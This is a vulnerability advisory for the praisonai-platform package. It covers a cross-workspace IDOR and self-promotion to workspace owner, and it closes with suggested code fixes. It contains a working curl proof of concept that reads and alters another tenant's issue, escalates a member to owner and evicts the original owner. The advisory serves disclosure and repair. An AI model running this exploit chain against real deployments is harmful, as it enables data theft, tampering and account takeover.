@@ -1,0 +1,380 @@
+PYSEC-2026-2935 PyPI/praisonai-platform — PraisonAI has Cross-Workspace IDOR and Privilege Escalation via Platform API
+package: praisonai-platform
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.1.4 (ECOSYSTEM)
+aliases: CVE-2026-48169, GHSA-gv23-xrm3-8c62
+references:
+  https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-gv23-xrm3-8c62
+  https://github.com/MervinPraison/PraisonAI
+  https://pypi.org/project/praisonai-platform
+  https://github.com/advisories/GHSA-gv23-xrm3-8c62
+  https://nvd.nist.gov/vuln/detail/CVE-2026-48169
+
+### Summary
+
+The PraisonAI Platform API has two authorization failures that together break workspace isolation. The service layer for issues and projects performs global primary-key lookups without checking workspace ownership, so any authenticated user can read, modify, and delete resources in any workspace just by swapping UUIDs in their API requests. On top of that, every member management endpoint (add, update role, remove) only requires `min_role="member"`, which lets any workspace member promote themselves to owner and kick out the original owner. A low-privilege member of one workspace can steal data from every other workspace and take over any workspace they belong to.
+
+Both issues come from the same gap: the route layer pulls `workspace_id` from the URL and verifies membership, but the service layer ignores the workspace scope for resource lookups and ignores the caller's role level for member operations. The `require_workspace_member()` dependency does its job correctly. The problem is that the service layer doesn't use the information it provides.
+
+### Details
+
+#### Part 1: Cross-Workspace IDOR (Issues and Projects)
+
+**Vulnerable Files:**
+- `praisonai_platform/services/issue_service.py`
+- `praisonai_platform/services/project_service.py`
+- `praisonai_platform/api/routes/issues.py`
+- `praisonai_platform/api/routes/projects.py`
+
+There is a consistent split between the route layer and the service layer. Routes pull `workspace_id` from the URL and verify membership:
+
+```
+GET /api/v1/workspaces/{workspace_id}/issues/{issue_id}
+                        ^^^^^^^^^^^^^^
+                        require_workspace_member() checks this
+```
+
+But the service methods these routes call perform global lookups that ignore `workspace_id` entirely:
+
+**IssueService.get(), line 72:**
+
+```python
+async def get(self, issue_id: str) -> Optional[Issue]:
+    """Get issue by ID."""
+    return await self._session.get(Issue, issue_id)
+```
+
+**ProjectService.get(), line 47:**
+
+```python
+async def get(self, project_id: str) -> Optional[Project]:
+    """Get project by ID."""
+    return await self._session.get(Project, project_id)
+```
+
+Both use `session.get(Model, pk)`, which is a global lookup by primary key with no `WHERE workspace_id = ?` filter.
+
+Compare that with the properly scoped `list_for_workspace()` methods in the same files:
+
+**IssueService.list_for_workspace(), line 76:**
+
+```python
+async def list_for_workspace(self, workspace_id: str, ...) -> list[Issue]:
+    stmt = select(Issue).where(Issue.workspace_id == workspace_id)
+    # ... properly scoped
+```
+
+The listing is scoped correctly. The get, update, and delete methods are not. Since `update()` and `delete()` in both services call `self.get()` internally, the workspace bypass cascades through all write operations too.
+
+**Route that discards workspace_id, issues.py line 82:**
+
+```python
+@router.get("/{issue_id}", response_model=IssueResponse)
+async def get_issue(
+    workspace_id: str,                                        # Extracted from URL
+    issue_id: str,
+    user: AuthIdentity = Depends(require_workspace_member),   # Membership verified
+    session: AsyncSession = Depends(get_db),
+):
+    svc = IssueService(session)
+    issue = await svc.get(issue_id)   # workspace_id never passed to service
+```
+
+**All affected operations:**
+
+| Service | Method | Line | Workspace scoped? |
+|---------|--------|------|-------------------|
+| IssueService | `get()` | 72 | No, uses `session.get(Issue, issue_id)` |
+| IssueService | `update()` | 97 | No, calls `self.get(issue_id)` |
+| IssueService | `delete()` | 150 | No, calls `self.get(issue_id)` |
+| IssueService | `list_for_workspace()` | 76 | **Yes**, filters by `workspace_id` |
+| ProjectService | `get()` | 47 | No, uses `session.get(Project, project_id)` |
+| ProjectService | `update()` | 62 | No, calls `self.get(project_id)` |
+| ProjectService | `delete()` | 88 | No, calls `self.get(project_id)` |
+| ProjectService | `get_stats()` | 97 | No, only filters by `project_id` |
+| ProjectService | `list_for_workspace()` | 51 | **Yes**, filters by `workspace_id` |
+
+#### Part 2: Workspace Takeover via Missing Role Enforcement
+
+**Vulnerable Files:**
+- `praisonai_platform/api/routes/workspaces.py` (member management routes)
+- `praisonai_platform/api/deps.py` (authorization dependency)
+- `praisonai_platform/services/member_service.py` (role hierarchy implementation)
+
+The authorization dependency supports role-based access:
+
+**require_workspace_member(), deps.py line 54:**
+
+```python
+async def require_workspace_member(
+    workspace_id: str,
+    user: AuthIdentity = Depends(get_current_user),
+    session: AsyncSession = Depends(get_db),
+    min_role: str = "member",         # Accepts higher roles, but nobody passes them
+) -> AuthIdentity:
+    member_svc = MemberService(session)
+    has = await member_svc.has_role(workspace_id, user.id, min_role)
+    if not has:
+        raise HTTPException(status_code=403, ...)
+```
+
+The `has_role()` method correctly implements role hierarchy:
+
+**MemberService.has_role(), member_service.py line 80:**
+
+```python
+async def has_role(self, workspace_id, user_id, required_role) -> bool:
+    """Role hierarchy: owner > admin > member."""
+    member = await self.get(workspace_id, user_id)
+    if member is None:
+        return False
+    role_levels = {"owner": 3, "admin": 2, "member": 1}
+    user_level = role_levels.get(member.role, 0)
+    required_level = role_levels.get(required_role, 0)
+    return user_level >= required_level
+```
+
+This works correctly, but no route ever calls `require_workspace_member` with `min_role="owner"` or `min_role="admin"`. Every member management route uses the default `"member"`:
+
+**Self-promotion, workspaces.py line 115:**
+
+```python
+@router.patch("/{workspace_id}/members/{user_id}", response_model=MemberResponse)
+async def update_member_role(
+    workspace_id: str,
+    user_id: str,
+    body: MemberUpdate,
+    user: AuthIdentity = Depends(require_workspace_member),  # min_role="member"
+    session: AsyncSession = Depends(get_db),
+):
+    member_svc = MemberService(session)
+    member = await member_svc.update_role(workspace_id, user_id, body.role)
+    # No check: is user modifying their own role? (self-promotion)
+    # No check: is body.role > caller's current role? (escalation)
+    # No check: is target a higher role than caller? (modifying superiors)
+```
+
+**Owner removal, workspaces.py line 130:**
+
+```python
+@router.delete("/{workspace_id}/members/{user_id}", status_code=204)
+async def remove_member(
+    workspace_id: str,
+    user_id: str,
+    user: AuthIdentity = Depends(require_workspace_member),  # min_role="member"
+    ...
+):
+    member_svc = MemberService(session)
+    removed = await member_svc.remove(workspace_id, user_id)
+    # No check: is target a higher role than caller?
+    # No check: is this the last owner?
+```
+
+Three checks are missing from `update_member_role`: self-modification, upward escalation, and modifying superiors. Two checks are missing from `remove_member`: role hierarchy and last-owner protection.
+
+### PoC
+
+**Prerequisites:**
+- A running PraisonAI Platform instance with default configuration
+- No special configuration required
+
+**Server setup:**
+
+```bash
+cd /path/to/PraisonAI
+pip install -e "src/praisonai-platform"
+python -m uvicorn praisonai_platform.api.app:create_app \
+  --factory --host 127.0.0.1 --port 8000
+```
+
+#### Scenario: Full attack chain (IDOR + Privilege Escalation)
+
+**Step 1: Victim (CEO) creates workspace with sensitive data**
+
+```bash
+BASE="http://127.0.0.1:8000/api/v1"
+
+# Register CEO
+VICTIM=$(curl -sfL -X POST "$BASE/auth/register" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"ceo@targetcorp.com","password":"Secure123!","name":"CEO"}')
+VICTIM_TOKEN=$(echo "$VICTIM" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+VICTIM_ID=$(echo "$VICTIM" | python3 -c "import sys,json; print(json.load(sys.stdin)['user']['id'])")
+
+# CEO creates workspace with confidential issue
+VICTIM_WS=$(curl -sfL -X POST "$BASE/workspaces/" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $VICTIM_TOKEN" \
+  -d '{"name":"Executive Board"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
+
+ISSUE_ID=$(curl -sfL -X POST "$BASE/workspaces/$VICTIM_WS/issues/" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $VICTIM_TOKEN" \
+  -d '{"title":"M&A Target List","description":"Acquiring CompanyX for $2B. Board approved. Do not disclose."}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
+echo "Victim workspace: $VICTIM_WS"
+echo "Secret issue: $ISSUE_ID"
+```
+
+**Step 2: Attacker registers and creates their own workspace**
+
+```bash
+ATTACKER=$(curl -sfL -X POST "$BASE/auth/register" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"attacker@evil.com","password":"Evil123!","name":"Attacker"}')
+ATK_TOKEN=$(echo "$ATTACKER" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+ATK_ID=$(echo "$ATTACKER" | python3 -c "import sys,json; print(json.load(sys.stdin)['user']['id'])")
+
+ATK_WS=$(curl -sfL -X POST "$BASE/workspaces/" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ATK_TOKEN" \
+  -d '{"name":"Attacker WS"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
+```
+
+**Step 3: IDOR - Attacker reads victim's confidential issue through their own workspace**
+
+```bash
+curl -sfL "$BASE/workspaces/$ATK_WS/issues/$ISSUE_ID" \
+  -H "Authorization: Bearer $ATK_TOKEN"
+```
+
+**Observed output (HTTP 200):**
+
+```json
+{
+  "id": "<ISSUE_ID>",
+  "workspace_id": "<VICTIM_WS>",
+  "title": "M&A Target List",
+  "description": "Acquiring CompanyX for $2B. Board approved. Do not disclose.",
+  "status": "backlog"
+}
+```
+
+The response contains the victim's `workspace_id`, which is different from the workspace in the request URL. The request was scoped to `$ATK_WS` but returned data from `$VICTIM_WS`.
+
+**Step 4: IDOR - Attacker modifies victim's issue**
+
+```bash
+curl -sfL -X PATCH "$BASE/workspaces/$ATK_WS/issues/$ISSUE_ID" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ATK_TOKEN" \
+  -d '{"title":"TAMPERED - M&A Target List"}'
+```
+
+**Observed output (HTTP 200):** Title updated across workspace boundary.
+
+**Step 5: Privilege escalation - CEO adds attacker as member (simulating invite)**
+
+```bash
+curl -sfL -X POST "$BASE/workspaces/$VICTIM_WS/members/" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $VICTIM_TOKEN" \
+  -d "{\"user_id\":\"$ATK_ID\",\"role\":\"member\"}" > /dev/null
+```
+
+**Step 6: Privilege escalation - Member promotes self to owner**
+
+```bash
+PROMO=$(curl -sfL -X PATCH "$BASE/workspaces/$VICTIM_WS/members/$ATK_ID" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ATK_TOKEN" \
+  -d '{"role":"owner"}')
+echo "$PROMO" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'Role: {d[\"role\"]}')"
+```
+
+**Observed output:**
+
+```
+Role: owner
+```
+
+The member used their own member-level token to promote themselves to owner.
+
+**Step 7: Privilege escalation - Attacker removes original owner**
+
+```bash
+curl -sLo /dev/null -w "HTTP %{http_code}" -X DELETE \
+  "$BASE/workspaces/$VICTIM_WS/members/$VICTIM_ID" \
+  -H "Authorization: Bearer $ATK_TOKEN"
+```
+
+**Observed output:** `HTTP 204` - CEO removed from their own workspace.
+
+**Step 8: Verify - Attacker is sole owner**
+
+```bash
+curl -sfL "$BASE/workspaces/$VICTIM_WS/members/" \
+  -H "Authorization: Bearer $ATK_TOKEN"
+```
+
+**Observed output:**
+
+```json
+[
+  {
+    "workspace_id": "<VICTIM_WS>",
+    "user_id": "<ATK_ID>",
+    "role": "owner"
+  }
+]
+```
+
+The CEO is locked out. The attacker is now the sole owner of "Executive Board" and all its data.
+
+
+### Impact
+
+- **Complete multi-tenant data breach:** Any authenticated user can read every issue and project across all workspaces by substituting resource UUIDs. The URL structure (`/workspaces/{workspace_id}/...`) implies tenant isolation but provides none.
+- **Cross-workspace data tampering:** An attacker can modify issue titles, descriptions, statuses, assignments, and project fields across workspace boundaries.
+- **Cross-workspace data deletion:** An attacker can delete issues and projects belonging to other workspaces.
+- **Workspace takeover from member role:** Any member can self-promote to owner and remove all other owners, gaining sole control of the workspace and everything in it.
+- **No recovery mechanism:** After takeover, the original owner cannot access or recover their workspace. There is no super-admin role, no audit-based rollback, and no last-owner protection.
+- **Chain amplifies impact:** The IDOR does not require membership in the target workspace, only membership in any workspace. The privilege escalation turns that foothold into full ownership. Together, a user with a single member-level invite to any workspace can read all data platform-wide and take ownership of any workspace they are invited to.
+
+---
+
+## Suggested Fix
+
+**1. Scope all service get/update/delete methods to workspace_id**
+
+```python
+# issue_service.py, replace get() at line 72:
+async def get(self, issue_id: str, workspace_id: str) -> Optional[Issue]:
+    """Get issue by ID, scoped to workspace."""
+    issue = await self._session.get(Issue, issue_id)
+    if issue is None or issue.workspace_id != workspace_id:
+        return None
+    return issue
+
+# Apply the same pattern to update(), delete(), and all ProjectService methods
+```
+
+**2. Pass workspace_id from routes to services**
+
+```python
+# issues.py, fix get_issue at line 82:
+issue = await svc.get(issue_id, workspace_id)  # Now workspace-scoped
+```
+
+**3. Require owner role for member management and add escalation guards**
+
+```python
+# workspaces.py, fix update_member_role:
+user: AuthIdentity = Depends(
+    lambda **kw: require_workspace_member(**kw, min_role="owner")
+)
+
+# Add self-modification and last-owner guards:
+if user_id == user.id:
+    raise HTTPException(403, "Cannot change your own role")
+
+# Fix remove_member:
+target = await member_svc.get(workspace_id, user_id)
+if target and target.role == "owner":
+    owners = [m for m in await member_svc.list_members(workspace_id) if m.role == "owner"]
+    if len(owners) <= 1:
+        raise HTTPException(403, "Cannot remove the last owner")
+```
